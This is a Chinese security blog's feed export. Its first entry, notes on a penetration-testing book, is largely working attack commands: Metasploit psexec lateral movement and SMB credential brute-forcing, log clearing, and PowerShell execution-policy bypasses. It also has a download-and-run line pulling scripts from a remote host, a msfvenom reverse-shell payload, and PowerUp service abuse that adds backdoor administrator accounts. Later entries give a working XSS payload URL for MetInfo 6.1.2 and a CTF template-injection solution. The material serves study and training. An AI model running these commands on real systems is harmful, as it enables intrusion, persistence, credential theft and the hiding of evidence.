exploit/windows/smb/psexecmsf exploit(windows/smb/psexec) &gt; show options Module options (exploit/windows/smb/psexec):   Name                  Current Setting  Required  Description   ----                  ---------------  --------  -----------   RHOST                                  yes       The target address   RPORT                 445              yes       The SMB service port (TCP)   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing   SERVICE_DISPLAY_NAME                   no        The service display name   SERVICE_NAME                           no        The service name   SHARE                 ADMIN$           yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share   SMBDomain             .                no        The Windows domain to use for authentication   SMBPass                                no        The password for the specified username   SMBUser                                no        The username to authenticate asExploit target:   Id  Name   --  ----   0   Automaticmsf exploit(windows/smb/psexec) &gt; set smbuser mang0smbuser =&gt; mang0msf exploit(windows/smb/psexec) &gt; set smbpass passmsf exploit(windows/smb/psexec) &gt; set rhost 10.51.0.11rhost =&gt; 10.51.0.11msf exploit(windows/smb/psexec) &gt; runmeterpreter &gt; migrate 2416meterpreter &gt; getuidmeterpreter &gt; getpidmeterpreter &gt; sysinfo</code></pre><p>抓hash（system权限）</p><h4 id="smb爆破内网"><a href="#smb爆破内网" class="headerlink" title="smb爆破内网"></a>smb爆破内网</h4><p>有域控密码 ，接下来内网扩大控制权限</p><ul><li>利用当前获取的域控账号密码，对整个域控ip段扫描</li><li>利用smb下的sm_login模块</li><li>端口转发或者socks代理进内网</li></ul><pre><code>meterpreter &gt; backgroundmsf exploit(multi/handler) &gt; route add 10.51.0.11 255.255.0.0msf exploit(multi/handler) &gt; search smb_loginmsf exploit(multi/handler) &gt; use auxiliary/scanner/smb/smb_login msf auxiliary(scanner/smb/smb_login) &gt; set rhostsmsf auxiliary(scanner/smb/smb_login) &gt; set smbuser msf auxiliary(scanner/smb/smb_login) &gt; set smbpassmsf auxiliary(scanner/smb/smb_login) &gt; set smbdomain msf auxiliary(scanner/smb/smb_login) &gt; set threads 16msf auxiliary(scanner/smb/smb_login) &gt; set creds</code></pre><p>可以使用meterpreter的端口转发，也可以使用metasploit下的 socks4a模块</p><p>meterpreter &gt; portfwd add -l 5555 -p 3389 -r 127.0.0.1</p><h3 id="0x05-清理日志"><a href="#0x05-清理日志" class="headerlink" title="0x05 清理日志"></a>0x05 清理日志</h3><ul><li>删除之前的域管理账号</li><li>删除所有在渗透过程中使用过的工具</li><li>删除应用程序、系统和安全日志</li><li>关闭所有meterpreter</li></ul><p>删除账号</p><pre><code>net user mang0 /dellogoff</code></pre><p>删除日志</p><p>meterpreter &gt; clearev</p><p>关闭所有msf连接</p><p>msf exploit(psexec) &gt; sessions</p><p>msf exploit(psexec) &gt;  sessions -K</p><h3 id="-1"><a href="#-1" class="headerlink" title=" "></a> </h3><h2 id="第6章-PowerShell攻击指南"><a href="#第6章-PowerShell攻击指南" class="headerlink" title="第6章 PowerShell攻击指南"></a><strong>第6章 PowerShell攻击指南</strong></h2><p>学习推荐windows powershell 实战指南和三叶草师傅的gitbook<a href="https://legacy.gitbook.com/book/rootclay/powershell-attack-guide/details" target="_blank" rel="external">https://legacy.gitbook.com/book/rootclay/powershell-attack-guide/details</a></p><p>在渗透测试中，PowerShell是不能忽略的一个环节，而且仍在不断地更新和发展，它具有令人难以置信的灵活性和功能化管理Windows系统的能力。PowerShell的众多特点使得它在获得和保持对系统的访问权限时，也成为攻击者首选的攻击手段。本章详细介绍了PowerShell的基本概念和常用命令，以及PowerSploit﹑Empire﹑Nishang等常用PowerShell攻击工具的安装及具体模块的使用，包括生成木马、信息探测、权限提升、横向渗透、凭证窃取、键盘记录、后门持久化等操作。</p><p>常用工具</p><ul><li>powerSplit</li><li>Nishang</li><li>Empire</li><li>PowerCat</li></ul><h3 id="Powershell基础"><a href="#Powershell基础" class="headerlink" title="Powershell基础"></a>Powershell基础</h3><p>powershell的后缀是ps1，哪为什么是ps1而不是ps2,ps3呢？那么理解这个问题呢我们可以看看powershell的特性，powershell是对下完全兼容的，也就是说你使用powershell 5.x的版本来执行powershell v1.0的代码也是完全没有问题的。</p><h4 id="执行策略"><a href="#执行策略" class="headerlink" title="执行策略"></a>执行策略</h4><p> PowerShell 提供了 Restricted、AllSigned、RemoteSigned、Unrestricted、Bypass、Undefined 六种类型的执行策略</p><p>如何绕过这些安全策略，下面提供几种方法，网上还有很多的绕过方法，：</p><table><thead><tr><th>名称</th><th>说明</th><th></th></tr></thead><tbody><tr><td>Get-ExecutionPolicy</td><td>获取当前的执行策略</td><td></td></tr><tr><td>Get-Content .\test.ps1 \</td><td>powershell.exe -noprofile -</td><td>通过管道输入进ps</td></tr><tr><td>powershell -nop -c “iex(New-Object Net.WebClient).DownloadString(‘<a href="http://192.168.1.2/test.ps1" target="_blank" rel="external">http://192.168.1.2/test.ps1</a>‘)”</td><td>通过远程下载脚本来绕过</td><td></td></tr><tr><td><code>$command = &quot;Write-Host &#39;Hello World!&#39;&quot; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)  $encodedCommand = [Convert]::ToBase64String($bytes)  powershell.exe -EncodedCommand $encodedCommand</code></td><td>通过BASE64编码执行</td></tr></tbody></table><h4 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h4><p>1.直接执行脚本.\shell.ps1</p><p>2.C:\Scripts\shell.ps1</p><h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><p>powershell -ExecutionPolicy Bypass -File .\xxx.ps1 绕过本地权限执行</p><p>powershell -EncodedCommand dwBoAG8AYQBtAGkACgA=</p><p>Powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile -File .\xxx.ps1 本地隐藏绕过权限执行脚本</p><h3 id="Powersploit"><a href="#Powersploit" class="headerlink" title="Powersploit"></a>Powersploit</h3><p>AntivirusBypass:发现杀毒软件的查杀特征</p><p>CodeExecution:在目标机上执行代码</p><p>Exfiltration:目标主机上的信息搜集工具</p><p>Mayhem:蓝屏等破坏性脚本</p><p>Persistence:后门脚本</p><p>Recon:以目标主机为跳板进行内网信息侦查</p><p>ScriptModification：目标主机上创建或修改脚本</p><h4 id="一-执行shellcode反弹meterpreter-shell"><a href="#一-执行shellcode反弹meterpreter-shell" class="headerlink" title="一.执行shellcode反弹meterpreter shell"></a>一.执行shellcode反弹meterpreter shell</h4><p>1.使用msfvenom生成一个powershell脚本。</p><p> <code>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.125 LPORT=4444 -f powershell -o /var/www/html/test</code></p><p>2.目标机powershell输入以下命令</p><pre><code>IEX(New-ObjectNet.WebClient).DownloadString(&amp;quot;http://192.168.110.129/CodeExecution/Invoke-Shellcode.ps1&amp;quot;)`IEX (New-ObjectNet.WebClient).DownloadString(&amp;quot;http://192.168.110.129/test&amp;quot;)Invoke-Shellcode -Shellcode ($buf)</code></pre><p>msf反弹成功</p><p>其他扩展可以看先知师傅的</p><p><a href="https://xz.aliyun.com/t/263" target="_blank" rel="external">https://xz.aliyun.com/t/263</a></p><h4 id="绕过杀软执行-invoke-Mimikatz"><a href="#绕过杀软执行-invoke-Mimikatz" class="headerlink" title="绕过杀软执行 invoke-Mimikatz"></a>绕过杀软执行 invoke-Mimikatz</h4><p><a href="https://zhuanlan.zhihu.com/p/24859556" target="_blank" rel="external">https://zhuanlan.zhihu.com/p/24859556</a></p><h3 id="Powerup"><a href="#Powerup" class="headerlink" title="Powerup"></a>Powerup</h3><p>通过脆弱的Windows服务提权；或者通过常见的系统服务，通过其继承的系统权限来完成提权等等，在内核提权行不通的时候，帮助我们寻找服务器脆弱点进而通过脆弱点实现提权的目的。</p><p>加载脚本模块: Import-Module .\PowerUp.ps1</p><p>查看模块的详细说明：Get-Help Invoke-AllChecks -full </p><p>执行所有的脚本来检查: Invoke-AllChecks</p><p>检查当前%PATH%是否存在哪些目录是当前用户可以写入的： Find-PathDLLHijack</p><p>从系统上的applicationHost.config文件恢复加密过的应用池和虚拟目录的密码: Get-ApplicationHost</p><p>检查AlwaysInstallElevated注册表项是否被设置，如果被设置，意味着的MSI文件是以system权限运行的: Get-RegistryAlwaysInstallElevated</p><p>检测Winlogin注册表AutoAdminLogon项有没有被设置，可查询默认的用户名和密码: Get-RegistryAutoLogon</p><p>获取DHCP服务的详细信息: Get-ServiceDetail -ServiceName Dhcp</p><p>检查当前用户能够在哪些服务的目录写入相关联的可执行文件，通过这些文件可达到提权的目的： Get-ServiceFilePermission</p><p>检查所有可用的服务，并尝试对这些打开的服务进行修改，如果可修改，则返回该服务对象：Test-ServiceDaclPermission</p><p>检查服务路径，返回包含空格但是不带引号的服务路径： Get-ServiceUnquoted</p><p>检查几个路径，查找是否存在这些文件，在这些文件里可能包含有部署凭据：Get-UnattendedInstallFile</p><pre><code>c:sysprepsysprep.xmlc:sysprepsysprep.infc:sysprep.infc:windowsPantherUnattended.xmlc:windowsPantherUnattendUnattended.xmlc:windowsPantherUnattend.xmlc:windowsPantherUnattendUnattend.xmlc:windowsSystem32Sysprepunattend.xmlc:windowsSystem32SysprepPantherunattend.xml</code></pre><p>检查开机自启的应用程序路径和注册表键值，返回当前用户可修改的程序路径： Get-ModifiableRegistryAutoRun</p><p>返回当前用户能够修改的计划任务程序的名称和路径： Get-ModifiableScheduledTaskFile</p><p>返回当前服务器上的web.config文件中的数据库连接字符串的明文：Get-Webconfig</p><p>用来通过修改服务添加用户到指定组，并可以通过定制-cmd参数触发添加用户的自定义命令： </p><pre><code>PS C:&gt; Invoke-ServiceAbuse -ServiceName VulnSVC # 添加默认账号PS C:&gt; Invoke-ServiceAbuse -ServiceName VulnSVC -UserName &quot;TESTLABjohn&quot; # 指定添加域账号PS C:&gt; Invoke-ServiceAbuse -ServiceName VulnSVC -UserName backdoor -Password password -LocalGroup &quot;Administrators&quot; # 指定添加用户，用户密码以及添加的用户组。PS C:&gt; Invoke-ServiceAbuse -ServiceName VulnSVC -Command &quot;net ...&quot;# 自定义执行命令</code></pre><p>恢复服务的可执行文件到原始目录：</p><pre><code>Restore-ServiceBinary -ServiceName VulnSVC</code></pre><p>检查某个用户是否在一个服务有自由访问控制的权限，返回true或false：Restore-ServiceBinary -ServiceName VulnSVC</p><p>输出一个自定义命令并且能够自删除的bat文件到$env:Tempdebug.bat，并输出一个能够启动这个bat文件的dll：Write-HijackDll</p><p>预编译C#服务的可执行文件。默认创建一个默认管理员账号。可通过Command定制自己的命令：</p><pre><code>PS C:&gt;Write-ServiceBinary -ServiceName VulnSVC # 添加默认账号PS C:&gt;Write-ServiceBinary -ServiceName VulnSVC -UserName &quot;TESTLABjohn&quot; # 指定添加域账号PS C:&gt;Write-ServiceBinary-ServiceName VulnSVC -UserName backdoor -Password Password123! # 指定添加用户，用户密码以及添加的用户组PS C:&gt; Write-ServiceBinary -ServiceName VulnSVC -Command &quot;net ...&quot; # 自定义执行命令</code></pre><p>通过Write-ServiceBinary写一个C#的服务用来添加用户：</p><pre><code>PS C:&gt; Install-ServiceBinary -ServiceName DHCPPS C:&gt; Install-ServiceBinary -ServiceName VulnSVC -UserName &quot;TESTLABjohn&quot;PS C:&gt;Install-ServiceBinary -ServiceName VulnSVC -UserName backdoor -Password Password123!PS C:&gt; Install-ServiceBinary -ServiceName VulnSVC -Command &quot;net ...&quot;</code></pre><h3 id="Empire"><a href="#Empire" class="headerlink" title="Empire"></a>Empire</h3><p>篇幅过程细读此两篇文章</p><p><a href="https://www.anquanke.com/post/id/87328" target="_blank" rel="external">https://www.anquanke.com/post/id/87328</a></p><p><a href="https://www.anquanke.com/post/id/87333" target="_blank" rel="external">https://www.anquanke.com/post/id/87333</a></p><p>这里学到的tips在于：在内网抓取的密码比较多又乱的时候，可以通过命令来正对hash/plaintext进行排列，增加，删除，导出等操作，这里我们将凭证存储导出为，输入creds export 目录/xx.csv命令。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>读完此书，学到了很多对于后渗透阶段怎么进行和优化，对于安全，一定不能忘却初心。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本文首发于&lt;a href=&quot;https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;amp;tid=45429&amp;amp;highlight=%E3%80%8AWeb%E5%AE%89%E5%85%A8%E6%94%BB%E9%98
      
    
    </summary>
    
      <category term="读书摘要" scheme="http://mang0.me/categories/%E8%AF%BB%E4%B9%A6%E6%91%98%E8%A6%81/"/>
    
    
      <category term="读书摘要" scheme="http://mang0.me/tags/%E8%AF%BB%E4%B9%A6%E6%91%98%E8%A6%81/"/>
    
  </entry>
  
  <entry>
    <title>验证码相关安全问题</title>
    <link href="http://mang0.me/archives/b46a6d47/"/>
    <id>http://mang0.me/archives/b46a6d47/</id>
    <published>2018-10-23T15:05:15.000Z</published>
    <updated>2018-11-02T13:52:18.469Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-乌云知识库"><a href="#0x00-乌云知识库" class="headerlink" title="0x00 乌云知识库:"></a>0x00 乌云知识库:</h2><ul><li><a href="http://drops.ichenfei.com/web-5459.html" target="_blank" rel="external">验证码安全问题汇总</a></li><li><a href="http://drops.ichenfei.com/tips-141.html" target="_blank" rel="external">聊一聊随机数安全</a></li><li><a href="http://drops.ichenfei.com/web-5048.html" target="_blank" rel="external">密码找回逻辑漏洞总结</a></li><li><a href="http://drops.ichenfei.com/papers-2035.html" target="_blank" rel="external">一些常见的重置密码漏洞分析整理</a></li></ul><h2 id="0x01-其他相关文章"><a href="#0x01-其他相关文章" class="headerlink" title="0x01 其他相关文章"></a>0x01 其他相关文章</h2><ul><li><a href="http://www.cnbraid.com/2016/captcha.html" target="_blank" rel="external">【安全加固】 验证码的实现原理和安全问题汇总</a></li><li><a href="http://blog.csdn.net/niaonao/article/details/51112686" target="_blank" rel="external">验证码原理分析及实现</a></li><li><a href="https://lizonghang.github.io/2016/07/10/%E9%9A%8F%E6%9C%BA%E6%95%B0%E5%AD%97%E5%9B%BE%E7%89%87%E9%AA%8C%E8%AF%81%E7%A0%81%E7%9A%84%E5%8E%9F%E7%90%86%E3%80%81%E7%94%9F%E6%88%90%E5%92%8C%E7%A0%B4%E8%A7%A3/" target="_blank" rel="external">随机数字图片验证码的原理、生成和破解</a></li><li><a href="http://www.lijiejie.com/safe-issues-of-captcha/" target="_blank" rel="external">图形验证码的常见安全问题</a></li></ul><h2 id="0x02-乌云相关案例"><a href="#0x02-乌云相关案例" class="headerlink" title="0x02 乌云相关案例"></a>0x02 乌云相关案例</h2><ul><li><a href="http://wy.ichenfei.com/searchbug.php?q=%E9%AA%8C%E8%AF%81%E7%A0%81" target="_blank" rel="external">http://wy.ichenfei.com/searchbug.php?q=验证码</a>  <!-- - [http://es.ichenfei.com:8000/wysearch/?q=验证码](http://es.ichenfei.com:8000/wysearch/?q=验证码) --></li></ul><h2 id="0x03-验证码实现原理"><a href="#0x03-验证码实现原理" class="headerlink" title="0x03 验证码实现原理"></a>0x03 验证码实现原理</h2><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201810240004_376.jpg" alt=""></p><ol><li>客户端发起一个请求；</li><li>服务端响应并创建一个新的SessionID同时生成一个随机验证码；</li><li>服务端将验证码和SessionID一并返回给客户端；</li><li>客户端提交验证码连同SessionID给服务端；</li><li>服务端验证验证码同时销毁当前Session中的验证码，返回给客户端结果。</li></ol><p>根据上面的实现流程，可以从四个方面入手，<strong>客户端问题</strong>、<strong>服务端问题</strong>、<strong>验证码本身问题</strong>,还有一个<strong>验证码流程设计</strong>问题。</p><h2 id="0x04-客户端问题"><a href="#0x04-客户端问题" class="headerlink" title="0x04 客户端问题"></a>0x04 客户端问题</h2><ul><li>客户端生成验证码<ul><li>验证码由客户端js生成并且仅仅在客户端用js验证</li></ul></li><li>验证码输出客户端<ul><li>输出在html中（神一样的程序员）</li></ul></li><li>验证码输出在cookie中，这个在乌云中案例也是比较多的。</li></ul><h2 id="0x05-服务端问题"><a href="#0x05-服务端问题" class="headerlink" title="0x05 服务端问题"></a>0x05 服务端问题</h2><ul><li>验证码不过期，没有及时销毁会话导致验证码复用<ul><li>这个是最常见的，乌云上面有大量的案例。</li></ul></li><li>没有进行非空判断<ul><li>很多时候，我们会遗留掉了验证过程中验证码为空的情况</li><li>比如去掉cookie中的某些值或者请求中验证码参数</li></ul></li><li>产生的验证码问题集内的答案非常有限</li></ul><h2 id="0x06-其他类型验证码绕过"><a href="#0x06-其他类型验证码绕过" class="headerlink" title="0x06 其他类型验证码绕过"></a>0x06 其他类型验证码绕过</h2><p>pkav http fuzzer工具可以简单绕过数字型验证码</p><p>基于机器学习识别验证码</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-乌云知识库&quot;&gt;&lt;a href=&quot;#0x00-乌云知识库&quot; class=&quot;headerlink&quot; title=&quot;0x00 乌云知识库:&quot;&gt;&lt;/a&gt;0x00 乌云知识库:&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://drops.ichenfei
      
    
    </summary>
    
      <category term="WebSecurity" scheme="http://mang0.me/categories/WebSecurity/"/>
    
    
      <category term="web" scheme="http://mang0.me/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Xss in MetInfo V6.1.2</title>
    <link href="http://mang0.me/archives/a5c61176/"/>
    <id>http://mang0.me/archives/a5c61176/</id>
    <published>2018-10-15T18:16:08.000Z</published>
    <updated>2018-11-02T13:52:15.846Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Xss-in-MetInfo-V6-1-2"><a href="#Xss-in-MetInfo-V6-1-2" class="headerlink" title="Xss in MetInfo V6.1.2"></a>Xss in MetInfo V6.1.2</h1><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>The vulnerability exists in the MetInfo6.1.2/admin/index.php page. Due to the lazy filtering of the parameter anyid, the XSS vulnerability is caused.</p><h2 id="Founction"><a href="#Founction" class="headerlink" title="Founction"></a>Founction</h2><p>The affected page located in admin’s management page:MetInfo6.1.2\admin\</p><h2 id="Reappearance"><a href="#Reappearance" class="headerlink" title="Reappearance"></a>Reappearance</h2><p>To build a website locally, first login to the website background: <a href="http://localhost/MetInfo6.1.2/admin/" target="_blank" rel="external">http://localhost/MetInfo6.1.2/admin/</a>. After the login is successful, construct the payload:</p><p>Xss vulnerability exists</p><pre><code>http://localhost:9096/MetInfo6.1.2/admin/index.php?lang=cn&amp;anyid=47oaflb%3c%2fscript%3e%3cscript%3ealert(1)%3c%2fscript%3emwq3k&amp;n=admin&amp;c=admin_admin&amp;a=doadd</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201810160210_976.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Xss-in-MetInfo-V6-1-2&quot;&gt;&lt;a href=&quot;#Xss-in-MetInfo-V6-1-2&quot; class=&quot;headerlink&quot; title=&quot;Xss in MetInfo V6.1.2&quot;&gt;&lt;/a&gt;Xss in MetInfo V6.1.2&lt;/
      
    
    </summary>
    
      <category term="代码审计" scheme="http://mang0.me/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="cve" scheme="http://mang0.me/tags/cve/"/>
    
  </entry>
  
  <entry>
    <title>护网杯wp</title>
    <link href="http://mang0.me/archives/173905c2/"/>
    <id>http://mang0.me/archives/173905c2/</id>
    <published>2018-10-13T15:53:02.000Z</published>
    <updated>2018-11-02T14:17:04.649Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://www.kingkk.com/2018/10/%E6%8A%A4%E7%BD%91%E6%9D%AF-web/" target="_blank" rel="external">http://www.kingkk.com/2018/10/%E6%8A%A4%E7%BD%91%E6%9D%AF-web/</a></p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy tornado"></a>easy tornado</h3><p>进入首页，看到文件列表。</p><p><a href="http://49.4.94.186:31331/" target="_blank" rel="external">http://49.4.94.186:31331/</a></p><p>随便点一个，可以读取文件内容，看到url里有两个参数，一个是文件名，另一个是签名。</p><p>根据 hint.txt ， 签名是 cookie_secret + 文件名 的 md5</p><pre><code>hint.txtmd5(cookie_secret + md5(filename))</code></pre><p><a href="http://49.4.94.186:31331/file?filename=Orz.txt&amp;signature=25d5cc7447f6e6a5785004b0a3362d6c" target="_blank" rel="external">http://49.4.94.186:31331/file?filename=Orz.txt&amp;signature=25d5cc7447f6e6a5785004b0a3362d6c</a></p><p>通过 FUZZ 参数，发现新的路由，即报错页面。</p><p><a href="http://49.4.94.186:31331/error?msg=%E7%AD%BE%E5%90%8D%E9%94%99%E8%AF%AF" target="_blank" rel="external">http://49.4.94.186:31331/error?msg=%E7%AD%BE%E5%90%8D%E9%94%99%E8%AF%AF</a></p><p>看到参数的 <code>签名错误</code> 被输出到页面里，应该是 SSTI。</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201811020000.png" alt=""></p><p><a href="http://blog.51cto.com/wengmengkai/1844886" target="_blank" rel="external">tornado—web框架基础入门</a> 通过这个进行快速学习tornado的开发</p><p><a href="http://www.tornadoweb.org/en/stable/" target="_blank" rel="external">tornado文档</a> 通过阅读文档快速掌握对象</p><p>安装:</p><pre><code>pip install tornado</code></pre><p>官方demo</p><pre><code class="python">import tornado.ioloopimport tornado.web# import uimodules as md# import uimethods as mtclass MainHandler(tornado.web.RequestHandler):    def get(self):        self.write(&quot;Hello, world&quot;)settings = {    &#39;template_path&#39;: &#39;views&#39;,        # html文件    &#39;static_path&#39;: &#39;statics&#39;,        # 静态文件（css,js,img）    &#39;static_url_prefix&#39;: &#39;/statics/&#39;,        # 静态文件前缀    &#39;cookie_secret&#39;: &#39;suoning&#39;,        # cookie自定义字符串加盐    # &#39;xsrf_cookies&#39;: True,         # 防止跨站伪造    # &#39;ui_methods&#39;: mt,           # 自定义UIMethod函数    # &#39;ui_modules&#39;: md,           # 自定义UIModule类}application = tornado.web.Application([    (r&quot;/&quot;, MainHandler),], **settings)if __name__ == &quot;__main__&quot;:    application.listen(8888)    tornado.ioloop.IOLoop.instance().start()</code></pre><p>通过<code>application = tornado.web.Application([(r&quot;/&quot;, MainHandler),], **settings)</code></p><p>很明显可以知道 cookie_secret 在RequestHandler这个对象里面</p><p>然后根据<a href="https://www.cnblogs.com/bwangel23/p/4858870.html" target="_blank" rel="external">Tornado小记 – 模板中的Handler</a></p><blockquote><p>handler 指向RequestHandler</p><p>而RequestHandler.settings又指向self.application.settings</p><p>所有handler.settings就指向RequestHandler.application.settings了！</p></blockquote><p>就知道怎么通过模版注入 </p><p>模版注入绕过:<a href="https://p0sec.net/index.php/archives/120/" target="_blank" rel="external">Flask/Jinja2模板注入中的一些绕过姿势</a></p><p>里面的payload 基本都包含 () 很明显题目过滤了 只保留了. 所以通过上面别名的方法来获得cookie_secret</p><p>可以通过这个 msg= 直接读出 tornado 的配置。</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/jl6Wwoc.png" alt=""></p><p>找到了 cookie_secret，根据 hint，构造 url</p><p>/fllllllllllag</p><p>{BVt!-e%cqXs<a href="&#x6d;&#x61;&#105;&#108;&#116;&#x6f;&#58;&#38;&#108;&#x6e;&#x29;&#x24;&#x37;&#x5f;&#x78;&#x49;&#64;&#x77;&#x4a;&#48;&#x50;&#x41;&#94;&#x39;&#81;&#x31;&#35;&#56;&#63;&#x6b;&#104;&#x6a;&#x28;&#x34;&#x61;&#x6f;&#x32;&#x75;&#114;&#x43;&#98;&#76;&#51;&#72;&#69;&#x7e;&#46;&#x47;&#112;&#122;&#70;&#x66;">&#38;&#108;&#x6e;&#x29;&#x24;&#x37;&#x5f;&#x78;&#x49;&#64;&#x77;&#x4a;&#48;&#x50;&#x41;&#94;&#x39;&#81;&#x31;&#35;&#56;&#63;&#x6b;&#104;&#x6a;&#x28;&#x34;&#x61;&#x6f;&#x32;&#x75;&#114;&#x43;&#98;&#76;&#51;&#72;&#69;&#x7e;&#46;&#x47;&#112;&#122;&#70;&#x66;</a>[YKSg</p><pre><code class="php">&lt;?php$str = &quot;/fllllllllllag&quot;;$a=md5($str);$str2 = &quot;{BVt!-e%cqXs&lt;&amp;ln)$7_xI@wJ0PA^9Q1#8?khj(4ao2urCbL3HE~.GpzFf&gt;[YKSg&quot;;$str3=$str2.$a;echo md5($str3);?&gt;</code></pre><p>2ad507bc2e8b59cce2e4147b0bfa169f</p><p><a href="http://49.4.94.186:31331/file?filename=/fllllllllllag&amp;signature=2ad507bc2e8b59cce2e4147b0bfa169f" target="_blank" rel="external">http://49.4.94.186:31331/file?filename=/fllllllllllag&amp;signature=2ad507bc2e8b59cce2e4147b0bfa169f</a></p><p>flag{fd29ee3314ce32fedce028ca753fb68a}</p><p><a href="http://49.4.78.81:30980/file?filename=/fllllllllllag&amp;signature=7bae09c2c6e2f6aa34df7dbee23db960" target="_blank" rel="external">http://49.4.78.81:30980/file?filename=/fllllllllllag&amp;signature=7bae09c2c6e2f6aa34df7dbee23db960</a></p><h3 id="LTSHOP"><a href="#LTSHOP" class="headerlink" title="LTSHOP"></a>LTSHOP</h3><p>本题的考点在于条件竞争以及整数的溢出问题</p><p>通过多线程发包的方式使得购买到 5 个以上的大辣条</p><p>可以使用burp抓包，发送到intruder</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201810181352_259.png" alt=""></p><p>设线程大一点</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201810181402_632.png" alt=""></p><p>start stack</p><p>得到10个大辣条越换两个辣条之王</p><p>抓包发现cookie有go_iris 猜测是go语言数据类型溢出</p><p>由于go使用强类型语言，猜测是整数溢出。 最后测试出是unsigned __int64,而uint64范围为18446744073709551615， 5个大辣条换一个辣条之王。</p><p>这里遇到了很大坑一开始我们一直用18446744073709551616，然后比赛完才发现要除以为除以5，所以最后num=3689348814741910324，那么要花费18446744073709551620个大辣条，超出uint64范围转换为5。</p><p>payload：</p><p>num=3689348814741910324</p><h3 id="easy-laravel"><a href="#easy-laravel" class="headerlink" title="easy_laravel"></a>easy_laravel</h3><p><a href="https://qvq.im/post/%E6%8A%A4%E7%BD%91%E6%9D%AF2018%20easy_laravel%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95" target="_blank" rel="external">https://qvq.im/post/%E6%8A%A4%E7%BD%91%E6%9D%AF2018%20easy_laravel%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95</a></p><p><a href="https://www.anquanke.com/post/id/161849" target="_blank" rel="external">https://www.anquanke.com/post/id/161849</a></p><p><code>ez_laravel</code>给了docker镜像，详细分析和复现下，确实是一道好题，膜4uuu师傅。</p><p><a href="https://github.com/sco4x0/huwangbei2018_easy_laravel" target="_blank" rel="external">https://github.com/sco4x0/huwangbei2018_easy_laravel</a></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="迟来的签到题"><a href="#迟来的签到题" class="headerlink" title="迟来的签到题"></a>迟来的签到题</h3><pre><code class="python">import base64tmp=&quot;&quot;string = &quot;AAoHAR1TJ1clUFYjVSRRV1cnIiUiV1BeUFNeIlBXI1BVI1UlUBs=&quot;string2 = base64.b64decode(string)print(string2)for i in range(1,256):    for j in string2:        tmp = tmp + chr(ord(j) ^ i)    print(tmp)    tmp=&quot;&quot;</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;http://www.kingkk.com/2018/10/%E6%8A%A4%E7%BD%91%E6%9D%AF-web/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.kingkk.com/2018/10/%E6
      
    
    </summary>
    
      <category term="CTF" scheme="http://mang0.me/categories/CTF/"/>
    
    
      <category term="ctf" scheme="http://mang0.me/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>web漏洞挖掘之点击劫持漏洞</title>
    <link href="http://mang0.me/archives/95d370e7/"/>
    <id>http://mang0.me/archives/95d370e7/</id>
    <published>2018-10-11T06:13:02.000Z</published>
    <updated>2018-11-02T13:52:15.724Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web漏洞挖掘之点击劫持漏洞"><a href="#web漏洞挖掘之点击劫持漏洞" class="headerlink" title="web漏洞挖掘之点击劫持漏洞"></a>web漏洞挖掘之点击劫持漏洞</h1><h2 id="0x00-点击劫持的概念"><a href="#0x00-点击劫持的概念" class="headerlink" title="0x00 点击劫持的概念"></a>0x00 点击劫持的概念</h2><p>点击劫持clickjacking，也叫UI-覆盖攻击（UI redress attack）；最早是在2008年，由互联网安全专家罗伯特·汉森和耶利米·格劳斯曼首创。</p><p>百度百科上对其的定义如下： 它是通过覆盖不可见的框架误导受害者点击。 虽然受害者点击的是他所看到的网页，但其实他所点击的是被黑客精心构建的另一个置于原网页上面的透明页面。 这种攻击利用了HTML中<code>&lt;iframe&gt;</code>标签的透明属性  </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808112329_760.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808112329_533.png" alt=""></p><p>图片中，都是进行了iframe嵌套，构成一个页面 来诱使用户进行点击。 以上就是点击劫持的一个基本概念 </p><h2 id="0x01点击劫持攻击的原理"><a href="#0x01点击劫持攻击的原理" class="headerlink" title="0x01点击劫持攻击的原理"></a>0x01点击劫持攻击的原理</h2><p>点击劫持实际上是一种视觉上的欺骗手段，攻击者通过利用一个透明的、不可见的iframe，覆盖在某网页上，然后诱导用户在该网页上进行点击等操作，而此时用户在不知情的情况下点击了透明的iframe页面 。攻击者通过调整iframe页面的位置，可以诱使用户恰好点击在iframe页面的一些功能性按钮上。 